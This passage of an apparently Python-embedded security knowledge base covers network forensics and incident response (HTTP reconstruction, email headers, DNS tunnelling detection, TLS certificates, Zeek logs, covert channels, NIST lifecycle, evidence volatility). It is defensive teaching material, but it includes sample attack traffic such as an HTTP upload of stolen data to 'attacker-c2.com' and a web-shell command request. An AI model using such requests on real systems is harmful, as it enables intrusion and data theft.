awk -F'\t' '$9 > 3600' conn.log | sort -t$'\t' -k9 -rn | head -20
```

### DNS as a Timeline Source

DNS queries precede TCP connections, making them an early-warning indicator:

```bash
# DNS lookups followed by connections to the resolved IP
# Merge Zeek dns.log (query → answer) with conn.log (dest IP)
```
""",
    },
    {
        "title": "HTTP Session Reconstruction from Packet Captures",
        "tags": ["http", "session-reconstruction", "pcap", "wireshark", "forensics", "web-attack"],
        "content": r"""# HTTP Session Reconstruction from Packet Captures

## Overview

Reconstructing HTTP sessions from packet captures allows forensic investigators to see exactly what an attacker requested and what the server returned — including uploaded web shells, exfiltrated data, exploit payloads, and API abuse. Unlike web server access logs that record only metadata, PCAP-based reconstruction reveals the complete request and response bodies.

## Tools for HTTP Reconstruction

### Wireshark

The most accessible tool for interactive HTTP analysis:

1. **Follow TCP Stream**: Right-click a packet → Follow → TCP Stream. Displays the complete request/response exchange in a single window.
2. **HTTP Stream**: Right-click → Follow → HTTP Stream (Wireshark 3.6+). Separates and reassembles HTTP/1.1 pipelined requests.
3. **Export HTTP Objects**: File → Export Objects → HTTP. Lists all transferred files (images, scripts, documents, binaries) with option to save.

### tshark (Command-Line)

```bash
# List all HTTP requests with method, URI, and host
tshark -r capture.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri

# Extract HTTP request bodies (POST data)
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data

# Export all HTTP objects to a directory
tshark -r capture.pcap --export-objects http,/evidence/http_objects/
```

### Zeek HTTP Log

Zeek's `http.log` provides structured metadata for every HTTP transaction:

```
Fields: ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, method, host,
        uri, referrer, user_agent, request_body_len, response_body_len,
        status_code, status_msg, filename, mime_type
```

## Reconstruction Workflow

### Step 1: Filter for Relevant Traffic

```bash
# Isolate HTTP traffic involving the attacker IP
tshark -r capture.pcap -Y "ip.addr == 10.0.0.50 && (tcp.port == 80 || tcp.port == 443 || tcp.port == 8080)" -w http_filtered.pcap
```

### Step 2: Identify the Attack Sequence

Look for these patterns in order:

1. **Reconnaissance**: Rapid sequential requests to different URIs (directory brute-forcing), scanner user agents (`sqlmap`, `nikto`, `dirbuster`).
2. **Exploitation**: Requests containing injection payloads (SQLi, XSS, command injection), unusual HTTP methods (PUT for file upload), oversized POST bodies.
3. **Post-exploitation**: Requests to newly created files (web shells), command execution via query parameters, encoded PowerShell in request bodies.
4. **Exfiltration**: Large response bodies, multiple sequential downloads, base64-encoded data in POST requests to external servers.

### Step 3: Extract and Analyse Payloads

```bash
# Extract a specific file uploaded by the attacker
tshark -r capture.pcap -Y "http.request.uri contains '/uploads/shell.php' && http.request.method == POST" --export-objects http,/evidence/uploads/

# Decode URL-encoded POST body
python3 -c "import urllib.parse; print(urllib.parse.unquote('cmd%3Dwhoami%26path%3DC%253A%255CWindows'))"
```

### Step 4: Handle HTTPS (TLS-Encrypted Traffic)

If the server's private key is available or TLS session keys were logged:

```bash
# Decrypt with server private key (RSA key exchange only)
tshark -r capture.pcap -o "tls.keys_list:10.0.0.10,443,http,/evidence/server.key" -Y http

# Decrypt with SSLKEYLOGFILE (works with all key exchanges including ECDHE)
tshark -r capture.pcap -o "tls.keylog_file:/evidence/sslkeys.log" -Y http
```

**SSLKEYLOGFILE** is the preferred method — set `SSLKEYLOGFILE=/path/to/keys.log` environment variable before starting the browser or application. Firefox, Chrome, and curl all support it.

## Common Attack Patterns in HTTP Reconstruction

### Web Shell Communication
```http
POST /uploads/cmd.aspx HTTP/1.1
Host: webserver.internal
Content-Type: application/x-www-form-urlencoded

cmd=whoami&token=a1b2c3
```
Response contains command output. Look for short, text-only responses to POST requests on unusual paths.

### Data Exfiltration via HTTP
```http
POST /api/upload HTTP/1.1
Host: attacker-c2.com
Content-Type: application/octet-stream
Content-Length: 15728640

[15 MB of stolen data]
```

### API Key Abuse
```http
GET /api/v2/users?limit=10000 HTTP/1.1
Authorization: Bearer eyJhbGciOiJI...
```
A stolen API token used to dump all user records — the large `limit` parameter and unusual access time are key indicators.
""",
    },
    {
        "title": "Email Header Analysis for Phishing and BEC Investigations",
        "tags": ["email", "headers", "phishing", "BEC", "SPF", "DKIM", "DMARC", "forensics"],
        "content": r"""# Email Header Analysis for Phishing and BEC Investigations

## Overview

Email remains the primary initial access vector for both commodity phishing and targeted business email compromise (BEC). Analysing email headers reveals the true origin of messages, identifies spoofing attempts, traces relay paths, and provides indicators of compromise (sender IPs, domains, infrastructure) for threat intelligence enrichment. Every SOC analyst must be fluent in header parsing.

## Email Header Structure

Headers are read **bottom to top** — the oldest `Received:` header is at the bottom (closest to the originating server), and each relay adds a new header on top.

### Critical Headers

| Header | Purpose | Forensic Value |
|---|---|---|
| `From:` | Displayed sender | Easily spoofed — never trust alone |
| `Return-Path:` | Envelope sender (MAIL FROM) | Used for SPF checks |
| `Received:` | Relay chain | Trace the actual path |
| `Message-ID:` | Unique identifier | Correlate across logs |
| `X-Originating-IP:` | Sender's IP (some providers) | Geolocation, reputation |
| `Authentication-Results:` | SPF/DKIM/DMARC verdicts | Spoofing detection |
| `Received-SPF:` | SPF check result | Domain authorisation |
| `DKIM-Signature:` | Cryptographic signature | Message integrity |
| `Reply-To:` | Where replies go | BEC indicator (differs from From) |

## SPF, DKIM, and DMARC Explained

### SPF (Sender Policy Framework)
Checks whether the sending IP is authorised by the domain's DNS TXT record.

```
v=spf1 include:_spf.google.com include:servers.mcsv.net -all
```
- `pass`: IP is authorised
- `fail`: IP is NOT authorised (strong spoofing indicator)
- `softfail`: IP is probably not authorised (often from misconfigured legitimate senders)

### DKIM (DomainKeys Identified Mail)
Cryptographic signature over specified headers and body. The receiving server verifies against the public key published in DNS.

```
DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1;
    h=from:to:subject:date; bh=base64_body_hash; b=base64_signature
```
- `pass`: Signature valid — headers and body not modified in transit
- `fail`: Signature invalid — possible tampering or forwarding issue

### DMARC (Domain-based Message Authentication, Reporting and Conformance)
Policy layer on top of SPF and DKIM. Requires **alignment** — the domain in `From:` must match the SPF or DKIM domain.

```
_dmarc.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
```
- `p=none`: Monitor only (no enforcement)
- `p=quarantine`: Move to spam
- `p=reject`: Block the message entirely

## Header Analysis Workflow

### Step 1: Extract and Parse Headers

Most email clients allow viewing raw headers (Gmail: "Show original", Outlook: "View Message Source"). Use an online parser (MXToolbox Header Analyzer, Google Admin Toolbox) or command-line tools for structured output.

### Step 2: Trace the Relay Path

Read `Received:` headers from bottom to top:

```
Received: from mail-out.attacker.com (198.51.100.77) by mx.victim.com; 15 Mar 2026 09:00:01 +0000
Received: from localhost (127.0.0.1) by mail-out.attacker.com; 15 Mar 2026 08:59:58 +0000
```

The first external hop (`198.51.100.77`) is the originating infrastructure. Look up this IP for reputation, ASN, geolocation, and hosting provider.

### Step 3: Verify Authentication Results

```
Authentication-Results: mx.victim.com;
    spf=fail (sender IP 198.51.100.77 not permitted for domain ceo-office.com);
    dkim=none;
    dmarc=fail (p=none dis=none)
```

This message claims to be from `ceo-office.com` but fails SPF, has no DKIM signature, and the domain has DMARC `p=none` (no enforcement) — classic BEC setup with a look-alike domain.

### Step 4: Analyse Suspicious Indicators

- **Reply-To mismatch**: `From: ceo@company.com` but `Reply-To: ceo@company-finance.com`
- **Display name spoofing**: `From: "John Smith CEO" <random@freemail.com>`
- **Recently registered domain**: WHOIS shows domain registered days before the email
- **Unusual sending infrastructure**: Marketing platform (SendGrid, Mailchimp) used for targeted BEC
- **Time zone anomalies**: Email sent at 3 AM in the purported sender's timezone

## Indicators for Threat Intel

Extract and document: originating IP, envelope sender domain, DKIM signing domain, `Message-ID` domain, any URLs in the body, attachment hashes. Submit to your TIP and check against known phishing infrastructure databases.
""",
    },
    {
        "title": "DNS Forensics — Query Logs, Zone Transfers, and Tunnelling Detection",
        "tags": ["dns", "forensics", "tunnelling", "exfiltration", "query-log", "passive-dns"],
        "content": r"""# DNS Forensics — Query Logs, Zone Transfers, and Tunnelling Detection

## Overview

DNS is essential infrastructure that attackers routinely abuse for command and control, data exfiltration, and reconnaissance. Because DNS is almost always permitted through firewalls and rarely inspected beyond basic filtering, it provides a reliable covert channel. DNS forensics — analysing query logs, passive DNS databases, zone transfer records, and anomalous patterns — is a critical capability for detecting and investigating sophisticated threats.

## DNS Log Sources

### Recursive Resolver Logs
Your internal DNS resolvers (Active Directory DNS, BIND, Unbound) log every query from endpoints. This is the most important DNS forensic source.

**Windows DNS Server analytical log:**
```
Enable via: dnscmd /config /loglevel 0x8000F331
Log path: %SystemRoot%\System32\dns\dns.log
```

**BIND query log:**
```
logging {
    channel query_log {
        file "/var/log/named/query.log" versions 10 size 100m;
        severity info;
        print-time yes;
        print-category yes;
    };
    category queries { query_log; };
};
```

### Passive DNS (pDNS)
Services like Farsight DNSDB, VirusTotal, and SecurityTrails record historical DNS resolutions globally. Query pDNS to find: what a domain resolved to at a specific time, what other domains share the same IP, and the history of a domain's DNS changes.

### Sysmon Event 22
On Windows endpoints, Sysmon Event 22 logs DNS queries with the querying process — essential for attributing malicious lookups to specific malware.

### Zeek dns.log
Zeek captures DNS transactions from network traffic, providing both query and response details in structured log format.

## Forensic Analysis Techniques

### Query Volume Analysis

Baseline normal DNS query patterns and look for anomalies:

```bash
# Top queried domains (Zeek dns.log)
awk -F'\t' '{print $10}' dns.log | sort | uniq -c | sort -rn | head -30

# Queries per hour (detect spikes)
awk -F'\t' '{split($1,a,"."); hour=strftime("%Y-%m-%d %H",a[1]); print hour}' dns.log | uniq -c
```

### Newly Observed Domains

Domains queried for the first time in your environment deserve scrutiny — especially if they were recently registered:

```bash
# Compare today's unique domains against the last 30 days baseline
comm -23 <(sort today_domains.txt) <(sort baseline_30d_domains.txt) > new_domains.txt
```

### DNS Tunnelling Detection

DNS tunnelling encodes data in DNS queries (typically as long subdomain labels) and responses (TXT or NULL records). Detection methods:

**Length-based detection:**
```bash
# Queries with unusually long names (>50 characters)
awk -F'\t' 'length($10) > 50' dns.log
```

**Entropy-based detection:**
Tunnelled data has high Shannon entropy (near random). Legitimate domains have lower entropy.

```python
import math
def shannon_entropy(s):
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    return -sum((f/len(s)) * math.log2(f/len(s)) for f in freq.values())

# Entropy > 3.5 on subdomain portion is suspicious
```

**Subdomain diversity:**
A single parent domain queried with hundreds of unique subdomains is a strong tunnelling indicator:

```bash
# Count unique subdomains per parent domain
awk -F'\t' '{n=split($10,a,"."); if(n>2) print a[n-1]"."a[n]}' dns.log | sort | uniq -c | sort -rn | head -20
```

**Record type anomalies:**
Tunnelling often uses TXT, NULL, or CNAME records. A spike in TXT queries from a single host to a single domain is highly suspicious.

### Zone Transfer Analysis

Unauthorised zone transfers (AXFR) reveal an attacker performing reconnaissance to map your internal DNS namespace:

```bash
# Check for AXFR attempts in Zeek
grep "AXFR" dns.log
```

Legitimate zone transfers occur only between authorised DNS servers — any AXFR from a workstation or non-DNS server is an incident.

## Common DNS-Based Attack Patterns

| Pattern | Indicator | Tool Examples |
|---|---|---|
| C2 over DNS | Periodic TXT queries to one domain | iodine, dnscat2, Cobalt Strike DNS |
| Data exfiltration | Long encoded subdomains, high query volume | dnscat2, DNSExfiltrator |
| DGA (Domain Generation Algorithm) | Many NXDomain responses, random-looking domains | Conficker, CryptoLocker |
| Fast flux | Rapid A record changes (TTL < 300) | Botnet infrastructure |
| Domain fronting | CDN domain in SNI, different Host header | APT evasion technique |

## Investigation Checklist

1. Identify the querying host (Sysmon Event 22 or resolver log client IP).
2. Determine the parent domain and check WHOIS registration date.
3. Query passive DNS for resolution history and co-hosted domains.
4. Calculate query entropy and subdomain diversity metrics.
5. Check for TXT/NULL record type anomalies.
6. Extract and attempt to decode suspected tunnelled data.
7. Correlate with endpoint logs — what process is generating these queries?
""",
    },
    {
        "title": "TLS Certificate Analysis for Network Forensics",
        "tags": ["tls", "ssl", "certificate", "forensics", "c2-detection", "network"],
        "content": r"""# TLS Certificate Analysis for Network Forensics

## Overview

TLS encryption protects legitimate traffic but also shields malicious communications from inspection. While the encrypted payload is inaccessible without keys, the TLS handshake itself — particularly the server certificate — exposes valuable forensic artefacts. Analysing certificates helps identify C2 infrastructure, detect man-in-the-middle attacks, uncover phishing domains, and track threat actor infrastructure across campaigns.

## Certificate Fields for Forensic Analysis

### Subject and Issuer

```
Subject: CN=login.microsoft-security-update.com, O=Unknown, L=Unknown, ST=Unknown, C=US
Issuer: CN=R3, O=Let's Encrypt, C=US
```

**Forensic observations:**
- Suspicious domain mimicking Microsoft with a Let's Encrypt certificate
- Legitimate Microsoft services use certificates issued by Microsoft's own CA or DigiCert
- `O=Unknown` fields suggest automated certificate generation

### Subject Alternative Names (SANs)

The SAN extension lists all domains covered by the certificate. Attackers often reuse certificates across multiple phishing domains:

```
X509v3 Subject Alternative Name:
    DNS:login.microsoft-security-update.com
    DNS:office365-verify.com
    DNS:azure-ad-login.net
```

All three domains on one certificate reveals the attacker's infrastructure scope.

### Validity Period

- **Very short validity** (< 90 days): Common for Let's Encrypt (legitimate but also favoured by attackers for free, automated certificates)
- **Very long validity** (> 2 years): Self-signed certificates, often used by C2 frameworks
- **Not-yet-valid or expired**: Misconfigured C2 infrastructure

### Serial Number and Fingerprint

The SHA-256 fingerprint uniquely identifies a certificate. Use it to:
- Track the same C2 server across IP changes
- Query Certificate Transparency logs for issuance history
- Correlate with threat intelligence databases (Shodan, Censys, VirusTotal)

## Extraction Techniques

### From PCAP (Wireshark/tshark)

```bash
# Extract all server certificates from a PCAP
tshark -r capture.pcap -Y "tls.handshake.type == 11" -T fields \
    -e ip.src -e ip.dst -e tls.handshake.certificate \
    > certificates.txt

# Detailed certificate info
tshark -r capture.pcap -Y "tls.handshake.type == 11" -T fields \
    -e x509sat.uTF8String -e x509ce.dNSName -e x509af.utcTime
```

### From Zeek (ssl.log and x509.log)

Zeek automatically extracts certificate metadata:

```
# ssl.log fields
ts, uid, server_name (SNI), subject, issuer, validation_status

# x509.log fields
certificate.subject, certificate.issuer, certificate.serial,
san.dns, certificate.not_valid_before, certificate.not_valid_after
```

### From Live Servers

```bash
# Retrieve certificate from a live server
echo | openssl s_client -connect suspicious-domain.com:443 -servername suspicious-domain.com 2>/dev/null | openssl x509 -text -noout

# Check Certificate Transparency logs
curl -s "https://crt.sh/?q=suspicious-domain.com&output=json" | python3 -m json.tool
```

## Detection Patterns

### Self-Signed Certificates on Standard Ports

C2 frameworks (Cobalt Strike, Metasploit, Mythic) generate self-signed certificates by default. Detect by checking whether the Subject and Issuer are identical and the issuer is not a known CA.

### Default C2 Certificates

Many C2 frameworks ship with recognisable default certificates:

| Framework | Default Subject | Detection |
|---|---|---|
| Cobalt Strike | CN=Major Cobalt Strike | Exact match (operators often change this) |
| Metasploit | CN=localhost (random serial) | Self-signed + localhost CN |
| Mythic | CN=Mythic | Default if not customised |

Shodan and Censys scan the internet and tag these — query: `ssl.jarm:"<known_C2_JARM>"`.

### JA3/JA3S and JARM Fingerprinting

**JA3**: Fingerprint of the TLS Client Hello (identifies the client application).
**JA3S**: Fingerprint of the Server Hello (identifies the server application).
**JARM**: Active fingerprint of TLS server configuration (10 probes → hash).

These fingerprints persist even when IPs and domains change, making them valuable for tracking C2 infrastructure.

### Certificate Transparency Monitoring

Subscribe to CT log monitors (e.g., certstream, Facebook CT monitor) for your organisation's domains. Any certificate issued for `*.yourcompany.com` that your organisation did not request indicates a potential phishing or MitM attack.

## Investigation Workflow

1. Extract the certificate from the suspicious connection (PCAP, Zeek, or live probe).
2. Record the SHA-256 fingerprint, Subject, Issuer, SANs, validity period, and serial number.
3. Query Certificate Transparency (`crt.sh`) for all certificates issued to the same domain.
4. Check Shodan/Censys for other IPs serving the same certificate.
5. Calculate JA3S and JARM fingerprints and compare against known C2 signatures.
6. Cross-reference with your threat intel platform and any related domains from SANs.
""",
    },
    {
        "title": "Zeek Log Forensics — conn.log, dns.log, and Beyond",
        "tags": ["zeek", "bro", "conn-log", "dns-log", "network-forensics", "NSM"],
        "content": r"""# Zeek Log Forensics — conn.log, dns.log, and Beyond

## Overview

Zeek (formerly Bro) is the gold standard for network security monitoring (NSM). Unlike signature-based IDS tools that alert on known patterns, Zeek passively analyses all network traffic and produces richly structured logs describing every connection, DNS query, HTTP transaction, SSL handshake, file transfer, and more. For forensic investigators, Zeek logs provide a searchable, structured record of network activity that is far more efficient to query than raw PCAP.

## Core Zeek Logs

### conn.log — The Foundation

Every TCP/UDP/ICMP session generates an entry in `conn.log`. Key fields:

| Field | Description | Forensic Use |
|---|---|---|
| ts | Connection start time | Timeline construction |
| uid | Unique connection ID | Correlate across all Zeek logs |
| id.orig_h / id.orig_p | Source IP and port | Identify attacker/victim |
| id.resp_h / id.resp_p | Destination IP and port | Target identification |
| proto | TCP/UDP/ICMP | Protocol classification |
| service | Detected application protocol | HTTP, DNS, SSL, SSH, etc. |
| duration | Connection length | Long C2 sessions |
| orig_bytes / resp_bytes | Bytes sent/received | Data exfiltration quantification |
| conn_state | Connection state code | Scan detection (S0, REJ) |
| missed_bytes | Bytes missed by Zeek | Capture quality indicator |

**Connection state codes:**
- `SF`: Normal established and finished
- `S0`: SYN sent, no reply (scan)
- `REJ`: Connection rejected (RST)
- `S1`: SYN-ACK seen, no final ACK
- `OTH`: Midstream traffic (missed handshake)

### dns.log — Domain Resolution Tracking

```
Fields: ts, uid, query, qtype_name, rcode_name, answers, TTLs
```

Forensic queries:
```bash
# NXDomain responses (DGA indicator)
awk -F'\t' '$16 == "NXDOMAIN"' dns.log | wc -l

# TXT record queries (tunnelling indicator)
awk -F'\t' '$14 == "TXT"' dns.log
```

### http.log — Web Traffic Metadata

Captures full HTTP transaction metadata without the body:

```bash
# All POST requests (potential data upload)
awk -F'\t' '$8 == "POST"' http.log

# Large response bodies (potential data download)
awk -F'\t' '$14 > 10000000' http.log  # > 10 MB responses
```

### ssl.log — TLS Connection Details

Records SNI (Server Name Indication), certificate Subject/Issuer, and validation status for every TLS connection:

```bash
# Self-signed certificates
awk -F'\t' '$10 == "self signed certificate"' ssl.log

# Certificate validation failures
awk -F'\t' '$10 != "ok" && $10 != "-"' ssl.log
```

### files.log — File Transfer Tracking

Zeek extracts metadata (and optionally the files themselves) for every file transferred over HTTP, FTP, SMTP, etc.:

```bash
# Executable file transfers
awk -F'\t' '$9 ~ /application\/x-dosexec|application\/x-executable/' files.log

# Files with known malicious hashes
# Compare $7 (SHA1) against threat intel
```

## Correlation Using UIDs

Zeek's unique connection ID (`uid`) ties all logs together. A single HTTP download generates entries in:

- `conn.log` (connection metadata)
- `dns.log` (domain resolution)
- `ssl.log` (TLS details, if HTTPS)
- `http.log` (HTTP transaction)
- `files.log` (downloaded file)

```bash
# Trace a complete connection story
uid="CYn8hZ1a2z3b4c5d6e"
grep "$uid" conn.log dns.log ssl.log http.log files.log
```

## Advanced Forensic Techniques

### Detecting C2 Beaconing

```bash
# Find hosts with many connections to the same destination
awk -F'\t' '{print $3, $5}' conn.log | sort | uniq -c | sort -rn | head -20

# Then check timing regularity for top pairs
awk -F'\t' '$3 == "10.0.0.25" && $5 == "203.0.113.50"' conn.log | awk -F'\t' '{print $1}'
```

### Identifying Data Exfiltration

```bash
# Top outbound data transfers to external IPs
awk -F'\t' '$3 ~ /^10\./ && $5 !~ /^10\./ {print $3, $5, $10}' conn.log |
    awk '{sum[$1" "$2] += $3} END {for (k in sum) print sum[k], k}' | sort -rn | head -20
```

### Scan Detection

```bash
# Hosts with many S0 (unanswered SYN) connections — port scanning
awk -F'\t' '$12 == "S0"' conn.log | awk -F'\t' '{print $3}' | sort | uniq -c | sort -rn | head -10
```

## Deployment Recommendations

- Deploy Zeek on a network TAP or SPAN port covering key segments (DMZ, server VLANs, internet egress).
- Ship logs to your SIEM (Elasticsearch/Splunk) for searchability and retention.
- Enable file extraction for executables and archives.
- Use Zeek packages (e.g., `ja3`, `hassh`) for enhanced fingerprinting.
- Retain Zeek logs for at least 90 days (storage-efficient compared to full PCAP).
""",
    },
    {
        "title": "Covert Channel Detection — DNS, ICMP, and Steganographic Techniques",
        "tags": ["covert-channel", "dns-tunnelling", "icmp-tunnel", "steganography", "exfiltration", "detection"],
        "content": r"""# Covert Channel Detection — DNS, ICMP, and Steganographic Techniques

## Overview

Covert channels allow attackers to communicate with compromised systems or exfiltrate data through protocols and methods that bypass traditional security controls. Because these channels abuse legitimate protocols (DNS, ICMP, HTTP) or hide data within innocent-looking files (steganography), they evade signature-based detection. Network forensic analysts must understand the common techniques and their detection methods to uncover hidden communication in incident investigations.

## DNS Covert Channels

DNS tunnelling is the most prevalent covert channel technique due to DNS's ubiquity and the fact that it is almost never blocked at the firewall.

### How It Works

1. Attacker registers a domain (e.g., `t.evil.com`) and runs a DNS server for it.
2. Malware on the victim encodes data as subdomain labels: `aGVsbG8gd29ybGQ.t.evil.com`
3. The query traverses the victim's DNS resolver to the attacker's authoritative server.
4. The attacker responds with encoded data in TXT, CNAME, or NULL records.

### Detection Indicators

| Indicator | Threshold | Rationale |
|---|---|---|
| Query length | > 50 characters | Normal domains average 15-25 chars |
| Subdomain label count | > 4 labels | `a.b.c.d.e.evil.com` is unusual |
| Unique subdomains per domain | > 50/hour | Legitimate domains have few unique subdomains |
| Shannon entropy of subdomain | > 3.5 | Encoded data appears random |
| TXT query percentage | > 10% from one host | Normal is < 1% |
| Query rate to single domain | > 100/hour | Beaconing + data transfer |

### Detection Tools

- **Zeek + freq.py**: Calculate character frequency analysis on DNS queries.
- **PassiveDNS**: Monitor for domains with abnormally high query diversity.
- **Sysmon Event 22**: Attribute suspicious DNS to the source process on Windows.
- **ION PCAP Analyzer**: Detects DNS tunnelling via subdomain diversity and query length heuristics.

## ICMP Covert Channels

ICMP echo request/reply (ping) packets have a data payload field that can carry arbitrary content. Tools like `icmpsh` and `ptunnel` exploit this for covert C2 and tunnelling.

### How It Works

1. Attacker runs an ICMP listener on their server.
2. Malware sends ICMP echo requests with encoded commands/data in the payload.
3. The attacker responds with ICMP echo replies containing return data.
4. Most firewalls allow ICMP echo for troubleshooting.

### Detection Indicators

```bash
# Large ICMP packets (normal ping payload is 32-64 bytes)
tshark -r capture.pcap -Y "icmp && frame.len > 128" -T fields -e ip.src -e ip.dst -e frame.len

# High ICMP packet rate between two hosts
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn
```

**Key indicators:**
- ICMP payload size > 64 bytes
- Sustained ICMP traffic between specific host pairs
- Non-standard ICMP types (types other than 0 and 8)
- ICMP traffic containing ASCII or base64-encoded strings in the payload
- ICMP between a workstation and an external IP (workstations rarely ping external hosts repeatedly)

## HTTP/HTTPS Covert Channels

### Header-Based Hiding

Data hidden in HTTP headers that proxies and WAFs do not inspect:

```http
GET /index.html HTTP/1.1
Host: legitimate-site.com
X-Custom-Header: aGVsbG8gd29ybGQ=
Cookie: session=base64_encoded_c2_data_here
```

### Body-Based Hiding

Small amounts of data appended to legitimate HTTP responses (e.g., after a closing `</html>` tag or within comments). Detection requires deep content inspection.

## Steganographic Channels

### Image Steganography

Data hidden in the least significant bits (LSB) of image pixels. A 1920x1080 PNG image can hide approximately 750 KB of data with no visible change.

**Detection methods:**
- **Statistical analysis**: Chi-squared test on pixel value distributions. LSB embedding alters the distribution of even/odd pixel values.
- **File size anomalies**: Stego images are often slightly larger than clean equivalents.
- **Metadata analysis**: Tools like `exiftool` may reveal editing software traces.
- **Visual inspection**: Enhancing the LSB plane can reveal embedded data patterns.

### Protocol Steganography

Data hidden in protocol fields that are normally ignored:
- TCP ISN (Initial Sequence Number) — can encode 32 bits per connection
- IP ID field — 16 bits per packet
- TCP urgent pointer (when URG flag is not set)
- TLS record padding

## General Detection Strategy

1. **Baseline normal traffic patterns**: Understand what is normal before looking for anomalies.
2. **Monitor protocol compliance**: Covert channels often violate protocol specifications.
3. **Track data volumes**: Compare bytes in vs bytes out per host pair — asymmetric ratios may indicate exfiltration.
4. **Entropy analysis**: High entropy in protocol fields that should contain structured data.
5. **Behavioural analytics**: Machine learning models trained on normal traffic can flag statistical outliers.
6. **Full packet inspection**: Examine payloads of allowed protocols (ICMP, DNS) for non-standard content.
""",
    },
]

# ============================================================
# COLLECTION 3: INCIDENT RESPONSE METHODOLOGY
# ============================================================

IR_METHODOLOGY = [
    {
        "title": "NIST Incident Response Lifecycle — SP 800-61 Framework",
        "tags": ["NIST", "incident-response", "SP-800-61", "lifecycle", "framework", "methodology"],
        "content": r"""# NIST Incident Response Lifecycle — SP 800-61 Framework

## Overview

NIST Special Publication 800-61 Rev. 2, "Computer Security Incident Handling Guide," defines the industry-standard incident response lifecycle. It provides a structured, repeatable methodology that ensures incidents are handled consistently, evidence is preserved, and lessons are learned. Every SOC team should align their IR processes to this framework, adapting the specifics to their environment while maintaining the four-phase structure.

## The Four Phases

### Phase 1: Preparation

Preparation is everything that happens before an incident occurs. It determines how quickly and effectively the team can respond.

**Key activities:**
- **IR plan documentation**: Written procedures for common incident types (malware, phishing, data breach, DDoS, insider threat)
- **Team structure**: Defined roles (IR lead, forensic analyst, communications, legal liaison, management)
- **Communication plan**: Escalation paths, contact lists (internal, legal, law enforcement, ISP), out-of-band communication methods
- **Tools and infrastructure**: Forensic workstations, jump kits, write blockers, network TAPs, isolated analysis networks
- **Training and exercises**: Tabletop exercises quarterly, full simulations annually, individual skill development
- **Baseline documentation**: Network diagrams, asset inventory, known-good configurations, normal traffic patterns

### Phase 2: Detection and Analysis

The most challenging phase — determining whether an event is a true incident and understanding its scope.

**Detection sources:**
- SIEM alerts and correlation rules
- EDR detections
- Network IDS/IPS alerts
- User reports
- Threat intelligence feeds
- External notifications (law enforcement, partners, security researchers)

**Analysis activities:**
- **Triage**: Prioritise based on impact and urgency
- **Validation**: Confirm the alert is a true positive
- **Scoping**: Determine affected systems, accounts, and data
- **Evidence collection**: Begin preserving volatile data immediately
- **Documentation**: Start the incident ticket with timestamps, findings, and decisions

**Severity classification:**

| Level | Criteria | Response |
|---|---|---|
| Critical (P1) | Active data exfiltration, ransomware spreading, critical infrastructure compromised | All hands, immediate containment |
| High (P2) | Confirmed compromise, lateral movement detected, sensitive data at risk | IR team activated, 1-hour response |
| Medium (P3) | Suspicious activity confirmed, single host compromised, no lateral movement | Standard IR, 4-hour response |
| Low (P4) | Policy violation, unsuccessful attack, minor malware (contained by EDR) | Queue-based, next business day |

### Phase 3: Containment, Eradication, and Recovery

**Containment** stops the bleeding — prevents further damage while preserving evidence.

- **Short-term containment**: Network isolation, account disabling, firewall blocks
- **Long-term containment**: Move to a clean VLAN with monitoring, apply patches, rebuild credentials

**Eradication** removes the threat:
- Delete malware, remove persistence mechanisms, close vulnerabilities
- Reset compromised credentials
- Verify removal with follow-up scans

**Recovery** restores normal operations:
- Restore from known-good backups
- Rebuild compromised systems from gold images
- Monitor closely for re-compromise (30-day heightened monitoring)

### Phase 4: Post-Incident Activity

Often neglected but arguably the most valuable phase for long-term security improvement.

- **Lessons learned meeting**: Within 1-2 weeks of incident closure
- **IR report**: Formal documentation of timeline, impact, root cause, and recommendations
- **Detection improvements**: New SIEM rules, updated playbooks, additional logging
- **Process improvements**: Identified gaps in tools, training, or communication
- **Metrics**: Time to detect, time to contain, time to recover, total impact

## Continuous Improvement Cycle

The four phases form a cycle, not a line. Post-incident improvements feed back into Preparation, detection rule updates improve Phase 2, and containment lessons refine Phase 3 playbooks. Each incident makes the team more effective for the next one.
""",
    },
    {
        "title": "Order of Volatility — Evidence Collection Priority",
        "tags": ["volatility", "evidence-collection", "forensics", "memory", "RFC-3227", "triage"],
        "content": r"""# Order of Volatility — Evidence Collection Priority

## Overview

RFC 3227 ("Guidelines for Evidence Collection and Archiving") establishes the principle that digital evidence must be collected in order of decreasing volatility — the most transient data first, because it will be lost or altered soonest. Violating this order risks destroying critical evidence. Every incident responder must internalise this hierarchy and apply it reflexively when arriving at a compromised system.

## The Volatility Hierarchy

Listed from most volatile (collect first) to least volatile (collect last):

### 1. CPU Registers and Cache
- **Volatility**: Nanoseconds
- **Practical impact**: Not typically collected in field IR. Relevant in advanced malware analysis and exploit forensics.

### 2. Memory (RAM)
- **Volatility**: Lost on power-off or reboot
- **What it contains**: Running processes, network connections, encryption keys, decrypted data, injected code, clipboard contents, command history, credentials in cleartext
- **Collection method**:
```bash
# Windows — WinPMEM
winpmem_mini_x64.exe memdump.raw

# Linux — LiME (Linux Memory Extractor)
insmod lime.ko "path=/evidence/memory.lime format=lime"

# Alternative — FTK Imager (GUI, Windows)
# Alternative — DumpIt (single-click memory dump)
```
- **Why first**: Memory contains evidence that exists nowhere else — process injection, in-memory-only malware, active network connections, decryption keys for encrypted volumes.

### 3. Network State
- **Volatility**: Changes continuously
- **What it contains**: Active connections, listening ports, ARP cache, routing table, DNS cache
- **Collection method**:
```bash
# Windows
netstat -anob > netstate.txt
ipconfig /displaydns > dnscache.txt
arp -a > arpcache.txt
route print > routes.txt

# Linux
ss -tulnp > netstate.txt
ip neighbor show > arpcache.txt
cat /proc/net/tcp > proc_tcp.txt
```

### 4. Running Processes
- **Volatility**: Changes with every process start/stop
- **What it contains**: Process list, parent-child relationships, command lines, loaded DLLs, open file handles
- **Collection method**:
```bash
# Windows
tasklist /v > processes.txt
wmic process list full > wmic_processes.txt
# Or: Get-Process | Select-Object * | Export-Csv processes.csv

# Linux
ps auxef > processes.txt
ls -la /proc/*/exe 2>/dev/null > proc_exe_links.txt
```

### 5. Disk Contents (File System)
- **Volatility**: Persists through reboot but can be overwritten
